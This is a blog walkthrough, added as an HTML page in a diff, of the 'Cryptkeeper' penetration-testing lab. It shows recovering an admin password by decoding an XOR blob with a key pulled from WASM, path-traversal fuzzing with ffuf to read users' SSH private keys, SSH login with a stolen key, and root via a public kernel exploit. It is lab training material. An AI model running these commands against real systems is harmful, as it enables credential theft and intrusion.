@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeup — penetration testing lab walkthrough.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <title>Offsec - Cryptkeeper - Walktrough — xlondra</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali:~$&nbsp;</span>
+                <span class="typed"></span><span class="cursor">▋</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor">
+                    <path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/>
+                </svg>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Offsec - Cryptkeeper - Walktrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date</strong> 2026-08-19</li>
+                    <li><strong>Platform</strong> TryHackMe</li>
+                    <li><strong>Difficulty</strong> Hard</li>
+                    <li><strong>Team</strong> <span class="team-badge red">Red Team</span></li>
+                    <li><strong>Link</strong> <a href="https://portal.offsec.com/machine/cryptkeeper-207277" target="_blank" rel="noopener noreferrer">Open Lab ↗</a></li>
+                    <li><strong>Tags</strong> <span class="tag">XOR</span> <span class="tag">RE</span> <span class="tag">WASM</span> <span class="tag">Linux</span></li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Summary</h2>
+
+                
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>Let's start with an nmap scan</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo nmap -p- -A -T4 TARGET_IP">└─$ sudo nmap -p- -A -T4 TARGET_IP</code></pre>
+</div>
+                <div class="command-wrapper output-block">
+    <div class="output-label">sudo nmap -p- -A -T4 192.168.107.244</div>
+    <pre><code data-copy-content="┌──(londra㉿kali)-[~]&#10;└─$ sudo nmap -p- -A -T4 192.168.107.244&#10;Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 21:10 +0200&#10;Nmap scan report for 192.168.107.244&#10;Host is up (0.026s latency).&#10;Not shown: 65532 closed tcp ports (reset)&#10;PORT      STATE    SERVICE VERSION&#10;22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)&#10;| ssh-hostkey:&#10;|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)&#10;|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)&#10;80/tcp    open     http    Apache httpd 2.4.52 ((Ubuntu))&#10;|_http-title: Login&#10;|_http-server-header: Apache/2.4.52 (Ubuntu)&#10;41169/tcp filtered unknown&#10;Device type: general purpose|router&#10;Running: Linux 5.X, MikroTik RouterOS 7.X&#10;OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3&#10;OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)&#10;Network Distance: 4 hops&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#10;&#10;TRACEROUTE (using port 1025/tcp)&#10;HOP RTT      ADDRESS&#10;1   25.35 ms 192.168.45.1&#10;2   25.34 ms 192.168.45.254&#10;3   25.37 ms 192.168.251.1&#10;4   25.40 ms 192.168.107.244&#10;&#10;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#10;Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds">┌──(londra㉿kali)-[~]
+└─$ sudo nmap -p- -A -T4 192.168.107.244
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 21:10 +0200
+Nmap scan report for 192.168.107.244
+Host is up (0.026s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+80/tcp    open     http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Login
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+41169/tcp filtered unknown
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT      ADDRESS
+1   25.35 ms 192.168.45.1
+2   25.34 ms 192.168.45.254
+3   25.37 ms 192.168.251.1
+4   25.40 ms 192.168.107.244
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds</code></pre>
+</div>
+                <p>It shows port 80 (<b>http</b>) and 22 (<b>ssh</b>) are open. A version scan is not needed here.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>I opened the webpage and landed on a login page:</p>
+                <img src="images/http.png" class="lab-image zoomable" alt="">
+                <p>Looking at the sites source code, I found a WASM script, and <b>application.js</b>, both containing login logic<br>I downloaded the WASM script and then decompiled the downloaded file using WABT: The WebAssembly Binary Toolkit. I downloaded WABT to my kali machine:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="wget https://github.com/WebAssembly/wabt/releases/download/1.0.41/wabt-1.0.41-linux-x64.tar.gz">└─$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.41/wabt-1.0.41-linux-x64.tar.gz</code></pre>
+</div>
+                <p>And then de-compiled it to C:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="./wasm2c authentication.wasm">└─$ ./wasm2c authentication.wasm</code></pre>
+</div>
+                <p>                <p>I read through both the decompile WASM and <b>application.js</b>. This is the authentication process:</p>
+                <ul>
+                    <li><b>1.</b> You type a username into the login form</li>
+                    <li><b>2.</b> The browser asks the server: "Give me the encoded password for this username"</li>
+                    <li><b>3.</b> The server responds with a XOR-encoded blob containing the password of the username you entered, concatenated with the username itself</li>
+                    <li><b>4.</b> The browser decrypts the blob</li>
+                    <li><b>5.</b> The browser compares the decrypted result to the password you typed</li>
+                    <li><b>6.</b> If they match -> login succeeds, a token gets sent to the server</li>
+                </ul></p>
+                <p>Now, what's so dangerous, is that step 4 and 5 are executed in the browser. 
+                    Thus, we control that process. Also, the XOR-key to decrypt the blob is hardcoded into WASM binary. It gets loaded into memory at startup and is trivially recoverable by anyone who decompiles the file.
+                    Because we control this process, we can simply ask the server for the encoded blob, decode it ourselves using the key we extracted from the WASM binary, and read the plaintext password directly, without ever needing to guess it.</p>
+                <p>I got help of <b>AI</b> during the process of reverse engineering the WASM binary<br>
+                    and crafting the following javascript-script.
+                    This script decodes the returned XOR-encoded blob inside the console:</p>
+                <p>                <details class="code-block">
+                    <summary>Javascript XOR decoder</summary>
+                    <pre><code>//Get encoded blob of the admin user
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "/loginUser?user=admin", false);
+xhr.send(null);
+var cp = xhr.responseText;
+console.log("Full CP:", cp, "Length:", cp.length);
+
+//Decode the XOR-encoded blob using the hardcoded XOR-key
+const key = [0x41,0x29,0x9F,0x13,0x45,0x42,0x88,0xFC,0xB8,0xD6,0xD0,0x5D,0x30,0xF6,0x12,0xCF];
+let decoded = "";
+for (let i = 0; i &lt; cp.length; i += 2) {
+    const byte = parseInt(cp.substring(i, i+2), 16);
+    decoded += String.fromCharCode(byte ^ key[(i/2) % key.length]);
+}
+console.log("Decoded:", decoded);
+
+//Last 5 chars should be "admin", rest is the password
+console.log("Password:", decoded.slice(0, -5));
+console.log("Username suffix:", decoded.slice(-5));
+                    </code></pre>
+                </details></p>
+                <p>I ran the script in the console at the login page and found the password:</p>
+                <img src="images/foundPassword.png" class="lab-image zoomable" alt="">
+                <p>I succesfully logged in using the retreived password:</p>
+                <img src="images/loggedIn.png" class="lab-image zoomable" alt="">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>We landed in a text editor. If we click for example, "Edit welcome.txt", it displays the following:</p>
+                <img src="images/welcome.txt.png" class="lab-image zoomable" alt="">
+                <p>Inspecting the browser network tab shows that the following URL is called when clicking on "Edit welcome.txt":</p>
+                <img src="images/thefullUrlIsDifferent.png" class="lab-image zoomable" alt="">
+                <p>We can leverage this to perform a path traversal attack. I first tried to access /etc/passwd, but that didn't work. I then pivoted to targeting users' private keys instead. Since we don't yet know which users exist on the system, we can fuzz for them with the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \   -u &quot;http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa&quot; -mr &quot;PRIVATE KEY&quot; -b &quot;session=SESSION_COOKIE&quot;">└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \   -u &quot;http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa&quot; -mr &quot;PRIVATE KEY&quot; -b &quot;session=SESSION_COOKIE&quot;</code></pre>
+</div>
+                <div class="command-wrapper output-block">
+    <pre><code data-copy-content="┌──(londra㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]&#10;└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \&#10;  -u &quot;http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa&quot; -mr &quot;PRIVATE KEY&quot; -b &quot;session=eyJsb2dnZWRJbiI6dHJ1ZSwibm9uY2UiOiI2MjY5YmFkZDNjNjg0MWRhNjBhMjBhODJhMGRjMDQ4MSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aoX3Sg.wR_AbC9ZhwGWbA-uXO8q8c5eVbc&quot;&#10;&#10;        /'___\  /'___\           /'___\&#10;       /\ \__/ /\ \__/  __  __  /\ \__/&#10;       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&#10;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&#10;         \ \_\   \ \_\  \ \____/  \ \_\&#10;          \/_/    \/_/   \/___/    \/_/&#10;&#10;       v2.1.0-dev&#10;________________________________________________&#10;&#10; :: Method           : GET&#10; :: URL              : http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa&#10; :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt&#10; :: Header           : Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZSwibm9uY2UiOiI2MjY5YmFkZDNjNjg0MWRhNjBhMjBhODJhMGRjMDQ4MSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aoX3Sg.wR_AbC9ZhwGWbA-uXO8q8c5eVbc&#10; :: Follow redirects : false&#10; :: Calibration      : false&#10; :: Timeout          : 10&#10; :: Threads          : 40&#10; :: Matcher          : Regexp: PRIVATE KEY&#10;________________________________________________&#10;&#10;harry                   [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 71ms]&#10;:: Progress: [10713/10713] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:16] :: Errors: 0 ::">┌──(londra㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
+└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
+  -u &quot;http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa&quot; -mr &quot;PRIVATE KEY&quot; -b &quot;session=eyJsb2dnZWRJbiI6dHJ1ZSwibm9uY2UiOiI2MjY5YmFkZDNjNjg0MWRhNjBhMjBhODJhMGRjMDQ4MSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aoX3Sg.wR_AbC9ZhwGWbA-uXO8q8c5eVbc&quot;
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/FUZZ/.ssh/id_rsa
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
+ :: Header           : Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZSwibm9uY2UiOiI2MjY5YmFkZDNjNjg0MWRhNjBhMjBhODJhMGRjMDQ4MSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aoX3Sg.wR_AbC9ZhwGWbA-uXO8q8c5eVbc
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Regexp: PRIVATE KEY
+________________________________________________
+
+harry                   [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 71ms]
+:: Progress: [10713/10713] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:16] :: Errors: 0 ::</code></pre>
+</div>
+                <p>As you can see, ffuf got a response containing "PRIVATE KEY" when it accessed the following URL:
+<span class='path'>http://192.168.107.244/loadFile?file=/var/www/fileEditor/fileEditorSite/static/files/../../../../../../../../../home/harry/.ssh/id_rsa</span></p>
+                <p>Accessing it in the browser reveals that it is an SSH private key. Pressing Ctrl+U then displays the private key in the correct format:</p>
+                <img src="images/privateKey.png" class="lab-image zoomable" alt="">
+                <p>We copy the content to a file called "id_rsa". Then, we execute the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="chmod 600 id_rsa &amp;&amp; ssh -i id_rsa harry@TARGET_IP">└─$ chmod 600 id_rsa &amp;&amp; ssh -i id_rsa harry@TARGET_IP</code></pre>
+</div>
+                <p>This opens up an SSH connection and allows us to read the first flag:</p>
+                <img src="images/ff.png" class="lab-image zoomable" alt="">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Privilege Escalation</h2>
+
+                <p>Wait, I want to tell you something... This box is unsolvable the way the author intended it. After 9 hours of struggling, I decided to take a look at the walkthrough myself. This is always a tough decision as it takes a piece of the fun away. However, the walkthrough stated, that, in order to escalate our privileges, we had to find a "XOR-encrypted backup file". I scanned the entire system for hours and hours without finding a file that came remotely close to the backup file. This is a screenshot from the official walkthrough:</p>
+                <img src="images/whatwhatwhat.png" class="lab-image zoomable" alt="">
+                <p>So, according to the walkthrough, <span class='path'>/tmp</span> should contain the file "<b>backup.tar.gz.encrypted</b>". Well, here is a screenshot of the fresh /tmp directory:
+
+</p>
+                <img src="images/itsnothere.png" class="lab-image zoomable" alt="">
+                <p>So... what now? Well, during enumeration I also figured out that this machines kernel is vulnerable to Copyfail:</p>
+                <img src="images/version.png" class="lab-image zoomable" alt="">
+                <p>So that is what I did. I found a good
+<a href="https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py" target="_blank" style="color: white">Copyfail PoC on github</a>
+
+</p>
+                <p>I copied the content to the machine and saved it under "copyfail.py":</p>
+                <img src="images/copyfail.png" class="lab-image zoomable" alt="">
+                <p>After that is done, we can execute it and become root instantly:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="chmod +x copyfail.py &amp;&amp; ./copyfail.py">└─$ chmod +x copyfail.py &amp;&amp; ./copyfail.py</code></pre>
+</div>
+                <p>Allowing us to read the root flag:</p>
+                <img src="images/gotit.png" class="lab-image zoomable" alt="">
+                <p>I didn't take the intended path, simply because that was impossible. I did however learned something new today.<br>I hope you did too. Have a nice rest of your day!</p>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        Copyleft &copy; <span id="year"></span> &nbsp;·&nbsp; xlondra
+    </footer>
+</body>
+</html>
